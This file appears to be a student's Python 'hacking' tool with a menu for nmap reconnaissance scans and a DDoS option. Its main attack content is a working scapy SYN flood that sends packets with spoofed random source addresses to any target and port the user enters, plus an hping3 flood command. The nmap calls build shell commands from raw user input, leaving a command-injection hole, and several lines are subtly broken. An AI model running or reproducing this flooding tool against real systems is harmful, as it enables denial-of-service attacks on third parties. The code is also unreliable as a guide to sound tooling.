# -*- coding: utf-8 -*-
# @Time    : 6/20/2021 12:00 AM
# @Author  : VLBaoNgoc-SE130726
# @Email   : ngocvlbse130726@fpt.edu.vn
# @File    : Outside_test.py.py
# @Software: PyCharm
from scapy.all import *
import os
import sys
import time
import signal
import random


###### COLOR
class style():
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def sigint_handler(signum, frame):
    OS()
    print("CTRL+C detected!")
    print(" \033[1;91m@Good bye\033[1;m")
    sys.exit()
def OS():
    os.system('cls' if os.name == 'nt' else 'clear')

signal.signal(signal.SIGINT, sigint_handler)


def logo():
    print("""\033[1;91m


      ▄• ▄▌▄▄▄▄▄.▄▄ · ▪  ·▄▄▄▄  ▄▄▄ .▄▄▄▄▄▄▄▄ ..▄▄ · ▄▄▄▄▄
▪     █▪██▌•██  ▐█ ▀. ██ ██▪ ██ ▀▄.▀·•██  ▀▄.▀·▐█ ▀. •██  
 ▄█▀▄ █▌▐█▌ ▐█.▪▄▀▀▀█▄▐█·▐█· ▐█▌▐▀▀▪▄ ▐█.▪▐▀▀▪▄▄▀▀▀█▄ ▐█.▪
▐█▌.▐▌▐█▄█▌ ▐█▌·▐█▄▪▐█▐█▌██. ██ ▐█▄▄▌ ▐█▌·▐█▄▄▌▐█▄▪▐█ ▐█▌·
 ▀█▄▀▪ ▀▀▀  ▀▀▀  ▀▀▀▀ ▀▀▀▀▀▀▀▀•  ▀▀▀  ▀▀▀  ▀▀▀  ▀▀▀▀  ▀▀▀ 

  Gen - github.com/Genethical99/ |_| v1.0
\033[1;m """)


def menu0():
    logo()
    print("""
        [1] - Reconnaissance
        [2] - DDoS 
        [0] - Exit
    """)


def menu1():
    logo()
    print("""
        1- Check Ping
        2- Basic Scan
        3- TCP Scan
        4- UDP Scan
        5- Service Scan
        6- Vulnerability Scan
        7- Scan all
        0- Exit
        """)
def menu2():
    logo()
    print("""
            1- Syn Flood
            2- hping3
            0- Exit
            """)
def start_menu():
    OS()
    menu0()
    while(True):
        print("Enter on of the options.")
        choice = input("root""\033[1;91m@H4ack4Fun:~$\033[1;m ")
        if choice == "1":
            OS()
            reconnaissance()
        elif choice == "2":
            OS()
            ddos_check()
        elif choice == "0":
            break
        else:
            print(style.FAIL+"[+] Please enter one of the options in the menu. \n You are directed to the main menu."+style.ENDC)
            time.sleep(2)
def reconnaissance():
    flag = True
    while(flag):
        OS()
        menu1()
        print("Enter on of the options.")
        choice = input("root""\033[1;91m@H4ack4Fun:~$\033[1;m ")
        if choice == "1":
            OS()
            logo()
            print(style.WARNING+"[+] Enter your IP address or example.com"+style.ENDC)
            print("")
            ip_address = input("     Enter Your Destination: ")
            checkPing = check_ping(ip_address)
            print(style.WARNING+checkPing+style.ENDC)
            input(style.OKGREEN+"Enter to continue !"+style.ENDC)
        elif choice == "2":
            OS()
            logo()
            print(style.WARNING+"[+] Enter your IP address or example.com"+style.ENDC)
            print("")
            ip_address = input("     Enter Your Destination: ")
            basicScan(ip_address)
            input(style.OKGREEN + "Enter to continue !" + style.ENDC)
        elif choice == "3":
            OS()
            logo()
            print(style.WARNING+"[+] Enter your IP address or example.com"+style.ENDC)
            print("")
            ip_address = input("     Enter Your Destination: ")
            tcpScan(ip_address)
            input(style.OKGREEN + "Enter to continue !" + style.ENDC)
        elif choice == "4":
            OS()
            logo()
            print(style.WARNING+"[+] Enter your IP address or example.com"+style.ENDC)
            print("")
            ip_address = input("     Enter Your Destination: ")
            udpScan(ip_address)
            input(style.OKGREEN + "Enter to continue !" + style.ENDC)
        elif choice == "5":
            OS()
            logo()
            print(style.WARNING+"[+] Enter your IP address or example.com"+style.ENDC)
            print("")
            ip_address = input("     Enter Your Destination: ")
            serviceScan(ip_address)
            input(style.OKGREEN + "Enter to continue !" + style.ENDC)
        elif choice == "6":
            OS()
            logo()
            print(style.WARNING+"[+] Enter your IP address or example.com"+style.ENDC)
            print("")
            ip_address = input("     Enter Your Destination: ")
            vulnScan(ip_address)
            input(style.OKGREEN + "Enter to continue !" + style.ENDC)
        elif choice == "7":
            OS()
            logo()
            print(style.WARNING+"[+] Enter your IP address or example.com"+style.ENDC)
            print("")
            ip_address = input("     Enter Your Destination: ")
            allScan(ip_address)
            input(style.OKGREEN + "[+] Enter to continue !" + style.ENDC)
        elif choice == "0":
            flag = False
            start_menu()
        else:
            print(style.FAIL+"[+] Please enter one of the options in the menu. \n You are directed to the main menu."+style.ENDC)
            time.sleep(2)

def ddos_check():
    flag = True
    while(flag):
        OS()
        menu2()
        print("Enter on of the options.")
        choice = input("root""\033[1;91m@H4ack4Fun:~$\033[1;m ")
        if choice == "1":
            OS()
            logo()
            dstIP = input("\n[+] Target IP : ")
            dstPort = int(input("[+] Target Port : "))
            counter = input("[+] How many packets do you want to send : ")
            SYN_Flood(dstIP, dstPort, int(counter))
            input(style.OKGREEN + "[+] Enter to continue !" + style.ENDC)
        elif choice == "2":
            OS()
            logo()
            print(style.WARNING + "[+] Enter your IP address or example.com" + style.ENDC)
            print("")
            ip_address = input("     Enter Your Destination: ")
            hping3Check(ip_address)
            input(style.OKGREEN + "[+] Enter to continue !" + style.ENDC)
        elif choice == "0":
            flag = False
            start_menu()
        else:
            print(style.FAIL+"[+] Please enter one of the options in the menu. \n You are directed to the main menu."+style.ENDC)
            time.sleep(2)
def check_ping(ip):
    response = os.system("ping -c 1 " + ip)
    # and then check the response...
    if response == 0:
        pingstatus = "Network Active"
    else:
        pingstatus = "Network Error"

    return pingstatus
def basicScan(ip):
    os.system("nmap "+ip)
def tcpScan(ip):
    os.system("nmap -sS -sA"+ip)
def udpScan(ip):
    os.system("nmap -sU "+ip)
def serviceScan(ip):
    os.system("nmap -sV -A"+ ip)
def vulnScan(ip):
    os.system("nmap -v --script vuln " + ip)
def allScan(ip):
    os.system("nmap -sS -sA -sV -O -A -Pn " + ip)
def hping3Check(ip):
    os.system("sudo hping3 -S -p 80 -c 10 --flood --rand-source " + ip)
def randomIP():
    ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
    return ip


def randInt():
    x = random.randint(1000, 9000)
    return x


def SYN_Flood(dstIP, dstPort, counter):
    total = 0
    print
    "Packets are sending ..."
    for x in range(0, counter):
        s_port = randInt()
        s_eq = randInt()
        w_indow = randInt()

        IP_Packet = IP()
        IP_Packet.src = randomIP()
        IP_Packet.dst = dstIP

        TCP_Packet = TCP()
        TCP_Packet.sport = s_port
        TCP_Packet.dport = dstPort
        TCP_Packet.flags = "S"
        TCP_Packet.seq = s_eq
        TCP_Packet.window = w_indow

        send(IP_Packet / TCP_Packet, verbose=0)
        total += 1
    sys.stdout.write("\nTotal packets sent: %i\n" % total)

def rootcontrol():
    start_menu()
    if os.geteuid() == 0:
        start_menu()
    else:
        print("Please run it with root access.")
        sys.exit()
if __name__ == '__main__':
    rootcontrol()
